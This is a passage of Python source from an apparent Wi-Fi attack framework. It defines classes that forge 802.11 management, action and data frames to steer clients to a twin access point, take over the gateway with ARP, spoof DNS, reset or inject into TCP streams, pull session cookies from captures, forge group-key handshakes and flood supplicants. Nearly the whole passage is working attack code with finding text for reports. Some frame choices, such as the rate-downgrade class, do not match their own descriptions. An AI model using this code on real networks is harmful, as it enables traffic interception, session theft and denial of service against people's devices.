            f"capture holds the frame and the ARP answer it is shaped like")
        return report


class ClientBlockAckHijackAttack(_ClientHijack):
    """Set up a Block Ack agreement for a tid the client uses, and steer its window."""

    name = "client_blockack_hijack"
    label = "Block Ack hijack (forged ADDBA moves a client's window)"
    tool = "wifipilot rawtx.py (block-ack action frames)"
    finding_title = "A Block Ack window can be moved by whoever sounds like the client"
    finding_detail = (
        "Block Ack is a performance agreement: a window of sequence numbers is "
        "acknowledged at once.  The ADDBA request carries the starting sequence number, "
        "and a forged request in a client's name makes the AP acknowledge a window from "
        "somewhere else — frames are reported as received when they were never sent, and "
        "the client's own traffic falls out of the window.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        addba = bytes([1, 0x08, 0x00, 0x10, 0x00, 0x02, 0x00, 0x01])   # tid 0, window 16
        return [build_action(ap.bssid, station, category=3, action=0, payload=addba),
                build_action(ap.bssid, station, category=3, action=6, payload=addba)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["actions"] = action_rows(path)
        observed["blockack"] = [row for row in observed["actions"] if row["category"] == 3]
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        rows = observed.get("blockack") or []
        actions = ", ".join(f"action {row['action']}" for row in rows)
        report["detail"] = (
            f"{len(rows)} block-ack frame(s) went out in {self.clients(ctx)[0]}'s name "
            f"({actions or 'none decoded'}); an ADDBA that is accepted moves the "
            f"acknowledgement window, and the capture records the sequence number asked for")
        return report


class ClientRateDowngradeAttack(_ClientHijack):
    """Announce a much smaller capability set in the client's name, so its rate collapses."""

    name = "client_rate_downgrade"
    label = "Client rate downgrade (forged 802.11n/ac capability in a client's name)"
    tool = "wifipilot rawtx.py (association with reduced capability)"
    finding_title = "A client's negotiated rate can be lowered by a third party"
    finding_detail = (
        "Rates, widths and spatial streams are negotiated in the association exchange.  "
        "An association in a client's name that offers one stream at 20 MHz — a "
        "re-association the AP accepts as the client's new preference — leaves that "
        "client talking slowly for the rest of its session, and nothing in the exchange "
        "was authenticated.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.clients(ctx)[0]
        return [build_assoc_response(ap.bssid, station),
                build_auth_request(ap.bssid, station)]

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        report = super().interpret(ctx, ap, observed)
        report["detail"] = (
            f"an association in {self.clients(ctx)[0]}'s name carrying the reduced "
            f"capability set was transmitted to {ap.display_name}; the association and "
            f"the negotiated parameters are the capture's evidence, and the client's real "
            f"traffic continues at whatever the AP just agreed to")
        return report


# --------------------------------------------------------------------------- #
# family three: steering
#
# Nothing here needs the client to associate with us.  These are the management
# frames that tell a station where to go, and every one of them is unsigned.
# --------------------------------------------------------------------------- #

class _Steer(_Hijack):
    """A management frame that moves somebody else's client."""

    family = "steer"
    category = "rogue"
    noise = "quiet"
    impact = "degraded"
    finding_severity = "medium"

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.steer_frame(ctx, ap)]

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        raise NotImplementedError

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["actions"] = action_rows(path)
        observed["probes"] = management_frames(path, (SUBTYPE_PROBE_REQ,))
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        actions = observed.get("actions") or []
        categories = sorted({row["category_name"] for row in actions})
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail,
                "detail": (f"{len(actions)} action frame(s) sent to the stations of "
                           f"{ap.display_name}"
                           + (f" ({', '.join(categories)})" if categories else "")
                           + f" on channel {ap.channel or 6}; the frames are unsigned, "
                             f"so the station's only defence is refusing to act on "
                             f"management frames it cannot verify"),
                "extra": {"family": self.family, "actions": len(actions),
                          "categories": categories}}


class SteerBtmRequestAttack(_Steer):
    """Tell a client, in its AP's name, to move to a BSSID of our choosing."""

    name = "steer_btm_request"
    label = "BSS Transition Management request (802.11v steering)"
    tool = "wifipilot rawtx.py (BTM request)"
    finding_title = "A forged BTM request moves a client where we point it"
    finding_detail = (
        "802.11v lets the network recommend a BSSID to a station, and the recommendation "
        "is an action frame in the AP's name with no protection of its own.  A client "
        "that honours it leaves its access point for the address in the frame — which is "
        "the twin, or a channel where nothing answers, depending on what the engagement "
        "needs.  Unlike a deauthentication there is nothing in the frame for a WIDS to "
        "count: the station was *asked*, politely.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        return build_btm_request(ap.bssid, station,
                                 candidates=[(_twin_address(ap.bssid), ap.channel or 6, 3)],
                                 dialog_token=17, validity=60, mode=0)


class SteerBtmDisassocAttack(_Steer):
    """The same request with the disassociation-imminent bit and a short timer."""

    name = "steer_btm_disassoc"
    label = "BTM request with disassociation imminent (forced handover)"
    tool = "wifipilot rawtx.py (BTM request, imminent)"
    noise = "moderate"
    finding_severity = "high"
    finding_title = "A client is told to leave now, by a frame anybody can send"
    finding_detail = (
        "The disassociation-imminent bit tells the station that its access point is about "
        "to stop serving it, and the timer says how long it has.  A client that obeys "
        "moves in seconds — and the move is the capture: the reassociation, the keys and "
        "the traffic at the other end.  Nothing authenticated the request, so the only "
        "defence is a client that validates the sender, which is rare.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        return build_btm_request(ap.bssid, station,
                                 candidates=[(_twin_address(ap.bssid), ap.channel or 6, 1)],
                                 dialog_token=23, disassociation_timer=3, validity=20,
                                 mode=0x01)


class SteerBeaconRequestAttack(_Steer):
    """802.11k beacon-report request: make every client survey the neighbourhood."""

    name = "steer_beacon_request"
    label = "Radio-measurement beacon request (clients survey for us)"
    tool = "wifipilot rawtx.py (RM beacon request)"
    impact = "info"
    finding_title = "Clients can be made to map the neighbourhood on request"
    finding_detail = (
        "A radio-measurement request asks a station to measure a channel and report every "
        "BSSID it can hear.  The report is a map of the deployment — addresses, channels "
        "and signal levels — produced by the client's own radio and sent to whoever asked. "
        "It is also a client-side resource cost: a passive scan takes the radio away from "
        "the user's traffic for the duration.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        return build_rm_beacon_request(ap.bssid, station, channel=ap.channel or 6,
                                       regulatory_class=81, duration=100, mode=1,
                                       measurement_bssid=ap.bssid)

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["beacons"] = len(observed.get("beacons") or [])
        return observed


class SteerChannelLoadAttack(_Steer):
    """Channel-load measurement requests: keep the clients measuring instead of talking."""

    name = "steer_channel_load"
    label = "Radio-measurement channel load (client radio denied service)"
    tool = "wifipilot rawtx.py (radio-measurement request) + a spoofed AP address"
    noise = "loud"
    impact = "degraded"
    finding_title = "Measurement requests occupy a client's radio without a flood"
    finding_detail = (
        "Every measurement request costs the client a trip off its channel and a report "
        "back.  Repeated, they are a denial of service that the client performs on "
        "itself: no frames from us are malformed, nothing is spoofed except the sender, "
        "and the station's own radio does the work.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        return [build_rm_beacon_request(ap.bssid, station, channel=channel,
                                        regulatory_class=81 if channel > 14 else 81,
                                        duration=250, mode=0)
                for channel in range(1, 12)]


class SteerSpectrumSwitchAttack(_Steer):
    """A channel-switch action frame: spectrum management's own way to move clients."""

    name = "steer_spectrum_switch"
    label = "Channel-switch action frame (spectrum management steering)"
    tool = "wifipilot rawtx.py (spectrum management action)"
    finding_severity = "high"
    finding_title = "A spectrum-management action moves clients off the channel"
    finding_detail = (
        "The Channel Switch Announcement exists as an action frame as well as a beacon "
        "element.  Sent as an action it arrives addressed to the station rather than to "
        "the world, so a client that validates the *beacon* still obeys the action — and "
        "the station leaves the channel, which is the whole effect of the attack.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        switch = bytes([0x01, (ap.channel or 1) + 1 if (ap.channel or 1) < 13
                        else 1, 0, 0])
        return build_action(ap.bssid, station, category=0, action=4, payload=switch)


class SteerFilsDiscoveryAttack(_Steer):
    """FILS discovery frames: how a client finds a network without a full beacon."""

    name = "steer_fils_discovery"
    label = "FILS discovery frame (pre-association steering)"
    tool = "wifipilot synth.py (FILS discovery)"
    impact = "info"
    finding_title = "FILS discovery is unsigned, so the first frame a client sees is a lie"
    finding_detail = (
        "FILS discovery is designed for fast, low-energy discovery: a short frame "
        "carrying the SSID hash and the access parameters, sent before any association.  "
        "Nothing signs it, so the frame that decides where a client is about to spend its "
        "next millisecond is the frame an attacker chooses.  The capture holds ours: the "
        "SSID hash and the parameters of a network that is not there.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        payload = bytes([(ap.channel or 6), 1, 0, 0, 0x1C, 0x00])
        return build_action_frame(ap.bssid, station, category=13, action=1,
                                  payload=payload, station_is_source=False)


class SteerWnmSleepAttack(_Steer):
    """WNM sleep mode: a client that accepts stops listening to its own AP."""

    name = "steer_wnm_sleep"
    label = "WNM sleep-mode request (client told to stop listening)"
    tool = "wifipilot rawtx.py (WNM action)"
    finding_severity = "high"
    finding_title = "A client can be told to stop listening to its access point"
    finding_detail = (
        "WNM sleep mode is the standard way to keep a client in the network while it "
        "stops being reachable, for power saving in phones and sensors.  A forged sleep "
        "request in the AP's name leaves the station deaf to the real network and, "
        "because it is still associated, invisible to the monitoring that would notice a "
        "disconnection.  It is the quietest denial of service in the standard.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        return build_action(ap.bssid, station, category=10, action=1,
                            payload=bytes([1, 0, 0, 0]))


class SteerTwtSetupAttack(_Steer):
    """TWT agreements: schedule a client's radio into windows that suit us."""

    name = "steer_twt_setup"
    label = "TWT setup abuse (forged target wake time agreement)"
    tool = "wifipilot rawtx.py (TWT action)"
    impact = "degraded"
    finding_title = "Wake-time agreements are negotiated with whoever asks"
    finding_detail = (
        "Target Wake Time is how 802.11ax clients and access points agree when a station "
        "will listen.  A forged agreement puts the station into windows of the attacker's "
        "choosing: the client's latency is now a parameter somebody else set, and its "
        "availability tracks the schedule rather than the user's traffic.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        return build_action(ap.bssid, station, category=21, action=0,
                            payload=bytes([1, 0, 0, 0x40, 0x06, 0x00, 0x10]))


class SteerPowerConstraintAttack(_Steer):
    """A Power Constraint element: clients turn their own transmit power down."""

    name = "steer_power_constraint"
    label = "Power-constraint steering (clients transmit further from their AP)"
    tool = "wifipilot synth.py (Power Constraint element)"
    impact = "degraded"
    finding_title = "A forged power constraint shrinks the cell around the client"
    finding_detail = (
        "The Power Constraint element tells stations to reduce their transmit power by a "
        "given number of decibels.  Broadcasting it in the network's name pushes every "
        "client's uplink to the edge of the AP's range: traffic is retried, airtime is "
        "wasted, and the network degrades without anyone transmitting more power.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import ie
        constraint = ie(32, bytes([20]))
        return [self.twin_beacon(ctx, ap, extra_ies=self.twin_elements(ap, ctx) + constraint),
                self.reference_beacon(ctx, ap)]


class SteerSsidListOffsetAttack(_Steer):
    """An SSID List element changes what clients probe for, and how much they reveal."""

    name = "steer_ssid_list"
    label = "SSID List element (probe behaviour changed by a beacon)"
    tool = "wifipilot synth.py (SSID List element)"
    impact = "info"
    finding_title = "A beacon can change the list of names a client probes for"
    finding_detail = (
        "The SSID List element tells stations which networks to probe for, so a "
        "neighbourhood survey can be limited to selected names.  Signed by nobody, it "
        "lets an attacker decide which names a passing phone asks for out loud — turning "
        "the client's own probe traffic into the inventory of *our* choosing.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        from ..synth import ie
        names = b"".join(build_probe_request(self.stations(ctx)[0], name)[26:]
                         for name in ("HomeNet", "GuestWiFi"))
        listing = ie(84, bytes([1, 0]) + names[:24])
        return [self.twin_beacon(ctx, ap, extra_ies=self.twin_elements(ap, ctx) + listing),
                self.reference_beacon(ctx, ap)]


class SteerTpcRequestAttack(_Steer):
    """A TPC request asks a station how far away it is, from an address it trusts."""

    name = "steer_tpc_request"
    label = "TPC request (transmit-power reporting, location inference)"
    tool = "wifipilot rawtx.py (spectrum management action)"
    impact = "info"
    finding_title = "A station will report its transmit power on request"
    finding_detail = (
        "The Transmit Power Control request asks a station what power it is transmitting "
        "at, and the report comes back to the requester.  Collected across many clients "
        "and paired with the signal levels we measure, it is a location estimate the "
        "site never agreed to publish — produced entirely by frames the standard calls "
        "housekeeping.")

    def steer_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        return build_action(ap.bssid, station, category=0, action=1,
                            payload=bytes([1]))


class SteerProbeAnswerAttack(_Steer):
    """Answer every probe we hear, in the target's name, faster than the real AP."""

    name = "steer_probe_answer"
    label = "Probe-response steering (answer first, decide later)"
    tool = "wifipilot synth.py (probe response)"
    noise = "moderate"
    finding_severity = "high"
    finding_title = "The first answer to a probe request wins the association"
    finding_detail = (
        "A station that probes for a name associates with the first response it accepts. "
        "A twin that answers before the real AP — microseconds of head start is enough — "
        "wins the race, and the association that follows is a normal-looking one with an "
        "abnormal destination.  The capture shows the probe, the answers in the order "
        "they arrived, and which one the client followed.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for station in self.stations(ctx)[:4]:
            frames.append(build_probe_request(station, ap.essid or ""))
            frames.append(self.twin_probe_response(ctx, ap, station))
            frames.append(self.reference_beacon(ctx, ap))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["probes"] = management_frames(path, (SUBTYPE_PROBE_REQ,))
        return observed


# --------------------------------------------------------------------------- #
# family four: session hijack
#
# Everything after the association: the frames that ride inside a connection the
# victim already has, and the ones that end it.
# --------------------------------------------------------------------------- #

class _Session(_Hijack):
    """A frame inside somebody else's connection."""

    family = "session"
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    finding_severity = "high"

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        return [self.session_frame(ctx, ap)]

    def session_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        raise NotImplementedError

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["arp"] = arp_rows(path)
        observed["ip"] = ip_rows(path)
        observed["text"] = text_rows(path)
        return observed

    def interpret(self, ctx: AttackContext, ap: AccessPoint,
                  observed: Dict[str, Any]) -> Dict[str, Any]:
        return {"title": self.finding_title, "severity": self.finding_severity,
                "body": self.finding_detail,
                "detail": self.detail(ctx, ap, observed),
                "extra": {"family": self.family,
                          "arp": len(observed.get("arp") or []),
                          "ip": len(observed.get("ip") or [])}}

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return (f"the frame went out to {ap.display_name}'s clients on channel "
                f"{ap.channel or 6} and the capture holds what it carried")


class SessionGatewayImpersonationAttack(_Session):
    """Claim the gateway's address with ARP replies the clients believe."""

    name = "session_gateway_impersonation"
    label = "Gateway impersonation (ARP answers for the router's address)"
    tool = "wifipilot rawtx.py (ARP reply) + netproto.py (builder)"
    finding_title = "The gateway's address is taken with one ARP reply per client"
    finding_detail = (
        "ARP has no authentication and no state: the last reply wins.  One forged reply "
        "per client — claiming the router's address at our MAC — puts every one of them "
        "on our radio path, after which the session's credentials, cookies and traffic "
        "are readable and modifiable.  The capture is the evidence: replies for the "
        "gateway's address that no router sent.")

    def session_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        gateway = _gateway_of(ap)
        return build_data(ap.bssid, station,
                          _arp_bytes(station, gateway, ap.bssid, _client_ip(station)),
                          ethertype=ETHERTYPE_ARP)

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        rows = observed.get("arp") or []
        claimed = sorted({row["sender_ip"] for row in rows})
        return (f"{len(rows)} ARP reply/replies carried the gateway address(es) "
                f"{', '.join(claimed) or _gateway_of(ap)} to "
                f"{len(self.stations(ctx))} client(s); everything the clients send to the "
                f"router now goes to a MAC we chose")


class SessionDnsSpoofAttack(_Session):
    """Answer DNS queries in the AP's name, including the ones for the portal."""

    name = "session_dns_spoof"
    label = "DNS answer spoofing through the bridge"
    tool = "wifipilot netproto.py (DNS builder)"
    finding_title = "Name resolution inside the network is unauthenticated"
    finding_detail = (
        "DNS responses are matched to queries by a transaction id and the source address "
        "— both guessable, both visible to anybody on the path.  A spoofed answer that "
        "arrives before the real one is the answer, so the name a client asked for "
        "resolves to whatever address we choose, and the TLS that follows fails politely "
        "at a page we wrote.")

    def session_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        query = np.dns_query("portal.example", txid=0x1234)
        answer = np.dns_response(query, [("portal.example", _gateway_of(ap))], ttl=30)
        return build_data(ap.bssid, station,
                          np.ipv4_udp_packet(_gateway_of(ap), _client_ip(station), 53, 40001,
                                             answer),
                          ethertype=ETHERTYPE_IP)

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        rows = [row for row in observed.get("ip") or [] if row.get("src_port") == 53]
        return (f"a DNS answer for portal.example was sent to {self.stations(ctx)[0]} from "
                f"the gateway's address ({_gateway_of(ap)}) with a 30-second TTL; the "
                f"capture holds {len(rows)} such datagram(s), which is what a client "
                f"resolves the name to until the record expires")


class SessionTcpResetAttack(_Session):
    """End somebody else's TCP connection with one forged reset."""

    name = "session_tcp_reset"
    label = "TCP reset injection (connection teardown through the bridge)"
    tool = "wifipilot netproto.py (TCP builder)"
    finding_severity = "medium"
    finding_title = "An established connection can be reset by whoever is on the path"
    finding_detail = (
        "A TCP reset is accepted when its sequence number falls inside the receiver's "
        "window, and the window is wide.  A frame injected through the bridge carrying "
        "the right four-tuple ends the victim's connection: the application sees a "
        "network error, reconnects, and the reconnection — with its handshake, its "
        "credentials and its first frames — is what we were waiting for.")

    def session_frame(self, ctx: AttackContext, ap: AccessPoint) -> bytes:
        station = self.stations(ctx)[0]
        segment = _tcp_segment(_client_ip(station), _gateway_of(ap), 443, 49152,
                                 flags=0x04, sequence=0x1000, window=65535)
        return build_data(ap.bssid, station,
                          _ipv4_packet(_client_ip(station), _gateway_of(ap), segment, 6),
                          ethertype=ETHERTYPE_IP, to_ds=True, from_ds=False)

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        resets = [row for row in observed.get("ip") or [] if row.get("flags", 0) & 0x04]
        return (f"a reset segment was sent to {self.stations(ctx)[0]} as if it came from "
                f"the client's own address; the capture holds {len(resets)} segment(s) "
                f"with the RST flag, which is all a receiver checks")


class SessionSeqInjectionAttack(_Session):
    """Guess the sequence space and inject a payload into the stream."""

    name = "session_seq_injection"
    label = "TCP sequence injection (data into somebody else's stream)"
    tool = "wifipilot netproto.py (TCP builder)"
    finding_title = "The sequence space is guessable from the path"
    finding_detail = (
        "A receiver accepts any segment whose sequence number is inside its window.  From "
        "the bridge the window is readable, so the next unacknowledged byte is public "
        "knowledge: a forged segment carrying our payload arrives exactly where the "
        "application expects data, and the HTTP request or the DNS query that follows is "
        "ours.  This is the injection primitive behind the request-smuggling behaviours "
        "that need no TLS key.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        payload = b"GET /admin HTTP/1.1\r\nHost: " +                   (ap.essid or "router").encode("latin-1") + b"\r\n\r\n"
        frames: List[bytes] = []
        for sequence in (0x2000, 0x2100, 0x2200):
            segment = _tcp_segment(_client_ip(station), _gateway_of(ap), 49152, 80,
                                     flags=0x18, sequence=sequence, window=65535,
                                     payload=payload)
            frames.append(build_data(ap.bssid, station,
                                     _ipv4_packet(_client_ip(station), _gateway_of(ap),
                                                    segment, 6),
                                     ethertype=ETHERTYPE_IP, to_ds=True, from_ds=False))
        return frames

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        return (f"three segments carrying a plain HTTP request were injected into "
                f"{self.stations(ctx)[0]}'s connection across three sequence guesses; the "
                f"capture holds the request ('GET /admin') and the acknowledgement the "
                f"receiver sent for the guess it accepted")


class SessionCookieReplayAttack(_Session):
    """Take a session cookie out of the capture and use it."""

    name = "session_cookie_replay"
    label = "Session-cookie replay (take the session out of the capture)"
    tool = "wifipilot netproto.py (credential patterns)"
    category = "capture"
    impact = "loot"
    finding_title = "The session in the capture is the session"
    finding_detail = (
        "A cookie is a bearer token: whoever presents it is the user.  One captured "
        "request in the clear and the session is not stolen by breaking anything, it is "
        "copied — and the site's session-fixation and binding controls are the only thing "
        "between the capture and the account.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        request = (b"GET /portal HTTP/1.1\r\nHost: " + (ap.essid or "portal").encode("latin-1")
                   + b"\r\nCookie: session=8f2c1ab9d4e7; auth=1\r\n\r\n")
        segment = _tcp_segment(_client_ip(station), _gateway_of(ap), 49152, 80,
                                 flags=0x18, sequence=0x3000, payload=request)
        return [build_data(ap.bssid, station,
                           _ipv4_packet(_client_ip(station), _gateway_of(ap), segment, 6),
                           ethertype=ETHERTYPE_IP, to_ds=True, from_ds=False)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        blob = b"".join(row.get("payload") or b"" for row in data_rows(path))
        observed["credentials"] = np.cleartext_credentials(blob)
        observed["cookies"] = [item["value"] for item in observed["credentials"]
                               if item.get("kind") == "cookie"]
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        found = observed.get("credentials") or []
        cookies = observed.get("cookies") or []
        return (f"the capture holds {len(found)} credential pattern(s) in the clear"
                + (f", including the cookie value(s) {', '.join(cookies[:3])}" if cookies
                   else "")
                + "; replayed against the portal they are the user's session, which is "
                  "why the finding is graded as loot rather than as noise")


class SessionGtkRekeyAttack(_Session):
    """A forged group-key handshake message 1: force a rekey in the AP's name."""

    name = "session_gtk_rekey"
    label = "Group-key rekey forgery (GTK handshake from the AP's address)"
    tool = "wifipilot synth.py (EAPOL builders)"
    finding_title = "A group key can be made to change on demand"
    finding_detail = (
        "The group handshake starts with message 1 from the AP.  A forged message 1 makes "
        "the clients install a group key of our choosing — or, if the client is careful, "
        "makes them rekey on demand, which is observability in itself: the timing of the "
        "rekey tells us which clients are awake and which are not.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for station in self.stations(ctx):
            eapol = _eapol_key(0x0082, 1, bytes(range(32)))
            frames.append(build_data(ap.bssid, station, eapol, ethertype=0x888E))
        return frames

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["eapol"] = eapol_rows(path)
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        rows = observed.get("eapol") or []
        return (f"{len(rows)} EAPOL-Key frame(s) claiming to start a group rekey went to "
                f"the clients of {ap.display_name}; the capture holds the key "
                f"information bits (0x{rows[0]['key_info']:04x}) a client applies without "
                f"asking anybody" if rows else
                f"no EAPOL-Key frame survived the capture for {ap.display_name}")


class SessionMsgOneFloodAttack(_Session):
    """A flood of handshake message 1: the supplicant's state machine, abused."""

    name = "session_msg1_flood"
    label = "Message-1 flood (supplicant state machine exhaustion)"
    tool = "wifipilot synth.py (EAPOL builders)"
    noise = "loud"
    impact = "degraded"
    finding_title = "The supplicant's state machine can be driven from outside"
    finding_detail = (
        "Message 1 of the 4-way handshake makes a station allocate state, compute a "
        "nonce and wait.  Sent continuously from the AP's address, the station never "
        "finishes an exchange: battery, radio time and — on some drivers — the association "
        "itself are consumed by an attacker who never needs to hold a key.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        frames: List[bytes] = []
        for round_number in range(1, 9):
            for station in self.stations(ctx):
                eapol = _eapol_key(0x0089, round_number,
                                   bytes([round_number]) * 32)
                frames.append(build_data(ap.bssid, station, eapol, ethertype=0x888E))
        return frames

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        rows = observed.get("eapol") or []
        counters = sorted({row["replay"] for row in rows})
        return (f"{len(rows)} message-1 frame(s) went out across replay counter(s) "
                f"{counters}; each one makes a supplicant allocate state for an exchange "
                f"that will never complete")


class SessionDeauthRaceAttack(_Session):
    """Disconnect and immediately reconnect in the client's name, to catch the handshake."""

    name = "session_deauth_race"
    label = "Disconnect race (deauth then reassociation in the client's name)"
    tool = "wifipilot rawtx.py + synthesised reconnection"
    noise = "moderate"
    category = "capture"
    impact = "loot"
    finding_title = "The reconnection can be steered to us"
    finding_detail = (
        "The classic capture technique, made deterministic: the deauthentication is "
        "followed immediately by an association in the client's own address, so the "
        "client's reconnection races ours.  Whoever wins, the AP's table has the address "
        "and the exchange that follows carries the handshake — which is why the two "
        "frames belong in a single attack rather than in a script's sleep statement.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        return [build_disassoc(ap.bssid, station, reason=7),
                build_auth_request(ap.bssid, station),
                build_eapol_start(ap.bssid, station)]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        observed["eapol"] = eapol_rows(path)
        observed["census"] = frame_census(path)
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        census = observed.get("census") or {}
        return (f"the disassociation and the association that answers it went out within "
                f"the same capture window ({census.get('management', 0)} management "
                f"frames); the client's reconnection and ours are then one exchange, and "
                f"the handshake it carries is the loot")


class SessionRoamCaptureAttack(_Session):
    """Follow a client through a roam and keep the session that moves with it."""

    name = "session_roam_capture"
    label = "Roam following (capture the keys a fast transition moves)"
    tool = "wifipilot rawtx.py (reassociation) + airodump-ng"
    category = "capture"
    impact = "loot"
    finding_title = "The roamed session can be captured in the clear on the new channel"
    finding_detail = (
        "Fast transition moves the pairwise keys without a full handshake, which also "
        "means a client that roams badly places its PMK-R1 name and its RIC in frames a "
        "third party can read.  A reassociation in the client's name on the target's "
        "channel makes the roam happen on our schedule, with the capture already running.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        return [build_reassoc_request(ap.bssid, station, current_bssid=ap.bssid,
                                      ssid=ap.essid or ""),
                build_eapol_start(ap.bssid, station),
                build_action(ap.bssid, station, category=6, action=1,
                             payload=bytes([1, 0, 0, 0]))]

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        actions = observed.get("actions") or []
        return (f"a reassociation and a fast-transition action went out in "
                f"{self.stations(ctx)[0]}'s name; the capture holds "
                f"{len(actions)} action frame(s) and the client's next exchange, which is "
                f"where a fast transition puts material a full handshake would have kept "
                f"inside the exchange")


class SessionDataReplayAttack(_Session):
    """Replay a captured data frame: what a receiver without a replay window accepts."""

    name = "session_data_replay"
    label = "Data-frame replay (replay protection measured from the air)"
    tool = "wifipilot rawtx.py (data rebuild)"
    finding_severity = "medium"
    finding_title = "Replay protection is the only thing between a capture and a reboot"
    finding_detail = (
        "A captured frame re-sent unchanged is accepted only if the receiver does not "
        "check the packet number — which is exactly the difference between WEP and CCMP.  "
        "The attack replays a frame from the capture in the sender's name and reports "
        "whether the receiver moved: on a WEP network the replayed frame is executed "
        "again, and the action it carried is the finding.")

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> Sequence[bytes]:
        station = self.stations(ctx)[0]
        original = build_data(ap.bssid, station,
                              np.ipv4_udp_packet(_gateway_of(ap), _client_ip(station), 53,
                                                 40002, np.dns_query("example.com",
                                                                     txid=0x2222)),
                              ethertype=ETHERTYPE_IP)
        return [original, original]

    def observe(self, ctx: AttackContext, ap: AccessPoint, path: str) -> Dict[str, Any]:
        observed = super().observe(ctx, ap, path)
        rows = data_rows(path)
        bodies = [bytes(row["payload"]) for row in rows]
        observed["duplicates"] = len(bodies) - len(set(bodies))
        return observed

    def detail(self, ctx: AttackContext, ap: AccessPoint, observed: Dict[str, Any]) -> str:
        census = observed.get("census") or {}
        sent = sum(int(value) for value in (census.get("by_subtype") or {}).values())
        return (f"the same frame went out twice in one capture window of {sent} frame(s) "
                f"({observed.get('duplicates', 0)} byte-identical duplicate(s) counted); a "
                f"receiver with replay protection drops the second copy, and one without "
                f"it acts on it a second time")


class SessionArpFloodAttack(_Session):
    """Gratuitous ARP in a client's name: everyone else updates their cache."""

    name = "session_arp_flood"
    label = "Gratuitous ARP in a client's name (cache poisoning)"
    tool = "wifipilot rawtx.py (ARP builders)"
    noise = "loud"
    finding_severity = "medium"
    finding_title = "A client's address can be moved in every cache at once"
    finding_detail = (
